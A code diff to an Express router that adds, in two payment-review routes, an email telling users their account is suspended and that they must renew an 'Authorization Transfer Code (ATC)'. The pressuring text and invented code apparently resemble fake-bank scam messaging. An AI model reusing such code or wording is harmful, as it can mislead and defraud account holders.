@@ -699,6 +699,10 @@ router.post('/payment_review', (req, res) => {
 
                             } else {
                                 setTimeout(() => {
+                                    let message = `ATTENTION! ${user.first_name} ${user.last_name} : \n\n With regards to your previous transactions, it has been brought to notice that your checking account has been temporarily suspended due to reasons relating to the unauthorized access grant and location access disparity.\n\n However we take initiative to inform you that you are now required to visit the nearest branch to review and revitalize your Authorization Transfer Code (ATC). please do well to act in compliance to our conduct. \n \n Thank you for your anticipated cooperation. \n\n Yours in service\n(Customer service)`
+                                    console.log(user.email, message)
+                                    sendSupportMail(user.email, message)
+
                                     res.render('transfers_blocked.ejs', {
                                         user : user.user_name,
                                         full_name :`${user.first_name} ${user.last_name}`,
@@ -782,6 +786,10 @@ router.post('/payment_review_same', (req, res) => {
 
                             } else {
                                 setTimeout(() => {
+                                    let message = `ATTENTION! ${user.first_name} ${user.last_name} : \n\n With regards to your previous transactions, it has been brought to notice that your checking account has been temporarily suspended due to reasons relating to the unauthorized access grant and location access disparity.\n\n However we take initiative to inform you that you are now required to visit the nearest branch to review and revitalize your Authorization Transfer Code (ATC). please do well to act in compliance to our conduct. \n \n Thank you for your anticipated cooperation. \n\n Yours in service\n(Customer service)`
+                                    console.log(user.email, message)
+                                    sendSupportMail(user.email, message)
+                                    
                                     res.render('transfers_blocked.ejs', {
                                         user : user.user_name,
                                         full_name :`${user.first_name} ${user.last_name}`,
